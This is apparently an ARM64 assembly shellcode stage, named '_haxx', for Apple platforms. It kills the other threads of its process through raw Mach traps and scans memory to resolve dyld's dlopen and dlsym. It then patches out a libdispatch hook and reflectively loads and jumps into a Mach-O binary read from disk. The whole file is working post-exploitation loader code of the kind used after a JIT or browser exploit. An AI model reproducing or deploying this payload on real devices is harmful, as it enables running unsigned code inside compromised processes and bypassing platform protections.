.align 4
.global _haxx

#define TRAP_MACH_MSG           -31
#define TRAP_MACH_TASK_SELF     -28
#define TRAP_MACH_REPLY_PORT    -26
#define SYS_READ                3
#define SYS_WRITE               4
#define SYS_OPEN                5
#define SYS_MMAP                197
#define SYS_LSEEK               199
#define SEEK_SET                0
#define SEEK_END                2
#define PROT_READ               1
#define PROT_WRITE              2
#define PROT_EXEC               4
#define MAP_PRIVATE             2
#define MAP_ANONYMOUS           0x1000
#define DYLD_INFO               17
#define DYLD_INFO_COUNT         5
#define RTLD_NOW                2
#define MSGH_BITS               0
#define MSGH_SIZE               4
#define MSGH_REMOTE_PORT        8
#define MSGH_LOCAL_PORT         12
#define MSGH_VOUCHER_PORT       16
#define MSGH_ID                 20
#define MSG_NDR                 24
#define MSG_OPT1                32
#define MSG_OPT2                36
#define MSG_ALL_IMAGE           40
#define dyldImageLoadAddress    32
#define PARAMS_BASE             0
#define PARAMS_ARGC             8
#define PARAMS_ARGV0            16
#define PARAMS_ARGV1            24
#define PARAMS_ENV0             32
#define PARAMS_APPLE0           40
#define PARAMS_APPLE1           48
#define PARAMS_STRINGS          56
#define CONST_STR               0x0074736e6f635f5f
#define DATA_STR                0x0000415441445f5f
#define DYLD_DLOPEN_OFFSET      0x58
#define DYLD_DLSYM_OFFSET       0x68 
#define THREAD_LIST             0x1c
#define THREAD_LIST_COUNT       0x34

.macro mov32
    movz $0, #((($1)>>00)&0xffff)
    movk $0, #((($1)>>16)&0xffff), lsl #16
.endmacro

.macro mov64
    movk $0, #((($1)>>48)&0xffff), lsl #48
    movk $0, #((($1)>>32)&0xffff), lsl #32
    movk $0, #((($1)>>16)&0xffff), lsl #16
    movk $0, #((($1)>>00)&0xffff)
.endmacro

_start:
    sub     sp, sp, #0x90
    stp     x29, x30, [sp, #0x80]
    add     x29, sp, #0x80

    // end all other threads
    mov     x16, TRAP_MACH_REPLY_PORT
    svc     #0x80
    mov     w4, w0

    mov     x16, TRAP_MACH_TASK_SELF
    svc     #0x80
    mov     w14, w0

    stp     w0, w4, [sp, MSGH_REMOTE_PORT]
    movz    w8, #0x1513
    movz    w2, #0x18
    stp     w8, w2, [sp]
    movz    w8, #0xd4a
    stp     wzr, w8, [sp, MSGH_VOUCHER_PORT]

    mov     x0, sp
    movz    w1, #3
    movz    w3, #0x40
    mov     x5, xzr
    mov     x6, xzr
    mov     x16, TRAP_MACH_MSG
    svc     #0x80

    ldur    x12, [sp, THREAD_LIST]
    ldur    w13, [sp, THREAD_LIST_COUNT]

1:
    sub     w13, w13, #1
    ldr     w15, [x12, w13, uxtw 2]
    cbz     w13, 2f
    cmp     w14, w15
    beq    1b

    mov     x16, TRAP_MACH_REPLY_PORT
    svc     #0x80
    mov     w4, w0

    stp     w15, w4, [sp, MSGH_REMOTE_PORT]
    movz    w8, #0x1511
    movz    w2, #0x18
    stp     w8, w2, [sp]
    movz    w8, #0xe10
    stp     wzr, w8, [sp, MSGH_VOUCHER_PORT]

    mov     x0, sp
    movz    w1, #3
    movz    w3, #0x2c
    mov     x5, xzr
    mov     x6, xzr
    mov     x16, TRAP_MACH_MSG
    svc     #0x80
    b       1b
2:

    // get dyld base
    mov     x16, TRAP_MACH_REPLY_PORT
    svc     #0x80
    mov     w4, w0

    mov     x16, TRAP_MACH_TASK_SELF
    svc     #0x80

    stp     w0, w4, [sp, MSGH_REMOTE_PORT]
    movz    w8, #0x1513
    movz    w2, #0x28
    stp     w8, w2, [sp]
    movz    w8, #0xd4d
    stp     wzr, w8, [sp, MSGH_VOUCHER_PORT]
    mov     w8, DYLD_INFO
    mov     w9, DYLD_INFO_COUNT
    stp     w8, w9, [sp, MSG_OPT1]
    str     xzr, [sp, MSG_ALL_IMAGE]

    mov     x0, sp
    movz    w1, #3
    movz    w3, #0x13c
    mov     x5, xzr
    mov     x6, xzr
    mov     x16, TRAP_MACH_MSG
    svc     #0x80

    ldr     x8, [sp, MSG_ALL_IMAGE]
    cbz     x8, _quit
    ldr     x10, [x8, dyldImageLoadAddress]


    // find dyld __DATA,__const
    mov     x11, x10
    mov64   x13, CONST_STR
    mov64   x14, DATA_STR

1:  
    add     x11, x11, #0x1
    ldur    x12, [x11]
    cmp     x12, x13
    bne     1b

    add     x11, x11, #0x10
    ldur    x12, [x11]
    cmp     x12, x14
    beq     2f
    b       1b

2:
    add     x11, x11, #0x20
    ldur    w8, [x11]
    add     x8, x8, x10

    // resolve dyld funcs
    add     x9, x8, DYLD_DLOPEN_OFFSET
    ldr     x9, [x9]
    cbz     x9, _quit
    stur    x9, [sp]

    add     x9, x8, DYLD_DLSYM_OFFSET
    ldr     x9, [x9]
    cbz     x9, _quit
    stur    x9, [sp, #0x8]


    // find voucher_activity_buffer_hook_install_4libtrace
    adr     x0, _dispatch_dylib
    movz    x1, 0x2
    ldr     x8, [sp]
    blr     x8
    cbz     x0, _quit

    adr     x1, _install_4libtrace_str
    ldr     x8, [sp, #0x8]
    blr     x8
    cbz     x0, _quit


    // decode adrp add to find __voucher_activity_buffer_hook
    ldur    w1, [x0]
    lsr     w2, w1, #29
    and     w2, w2, #3

    lsl     w3, w1, #8
    lsr     w3, w3, #13
    lsl     w3, w3, #2

    orr     w4, w3, w2
    lsl     w4, w4, #12

    and     x5, x0, #~0xfff
    add     x5, x5, x4

    ldur    w1, [x0, #0x4]
    lsr     w1, w1, #10
    and     w1, w1, #0xfff
    add     x8, x5, x1

    // patch out __voucher_activity_buffer_hook
    str     xzr, [x8]
    nop

    // get __dyld_start
    ldr     x8, [sp, MSG_ALL_IMAGE]
    ldr     x10, [x8, dyldImageLoadAddress]
    add     x10, x10, #0x1000

    // open and map file to jitted region
    mov     x16, SYS_OPEN
    adr     x0, _target_macho
    mov     x1, xzr
    svc     #0x80
    cmp     x0, xzr
    ble     _quit
    mov     w8, w0

    mov     x16, SYS_LSEEK
    mov     x1, xzr
    mov     x2, SEEK_END
    svc     #0x80
    cmp     x0, xzr
    ble     _quit
    mov     w9, w0

    mov     x16, SYS_LSEEK
    mov     w0, w8
    mov     x1, xzr
    mov     x2, SEEK_SET
    svc     #0x80
    cmp     x0, xzr

    adr     x0, _start
    and     x0, x0, #~0xfff
    add     x0, x0, #0x1000
    mov     x11, x0

    mov     x16, SYS_READ
    mov     x1, x0
    mov     w0, w8
    mov     w2, w9
    svc     #0x80
    cmp     x0, xzr
    ble     _quit

    mov     x16, SYS_MMAP
    mov     x0, xzr
    mov     x1, 0x800000
    mov     x2, PROT_READ | PROT_WRITE
    mov     x3, MAP_PRIVATE | MAP_ANONYMOUS
    mov     x4, #-1
    mov     x5, xzr
    svc     #0x80
    cmp     x0, xzr
    ble     _quit
    add     x8, x0, #0x40000

    // setup for __dyld_start call
    stur    x11, [x8, PARAMS_BASE]
    movz    w9, #1
    stur    w9, [x8, PARAMS_ARGC]
    
    add     x9, x8, PARAMS_STRINGS
    stur    x9, [x8, PARAMS_ARGV0]
    stur    x9, [x8, PARAMS_APPLE0]
    
    mov     x9, xzr
    stur    x9, [x8, PARAMS_ARGV1]
    stur    x9, [x8, PARAMS_ENV0]
    stur    x9, [x8, PARAMS_APPLE1]

    adr     x9, _target_macho
    stur    x9, [x8, PARAMS_STRINGS]
    mov     sp, x8
    br      x10

_quit:
    movz    w0, #0
    mov     x16, #1
    svc     #0x80
    ret

_target_macho:
    .ascii "/test_bin\0\0\0"

_dispatch_dylib:
    .ascii "/usr/lib/system/libdispatch.dylib\0\0\0\0"

_install_4libtrace_str:
    .ascii "voucher_activity_buffer_hook_install_4libtrace\0\0"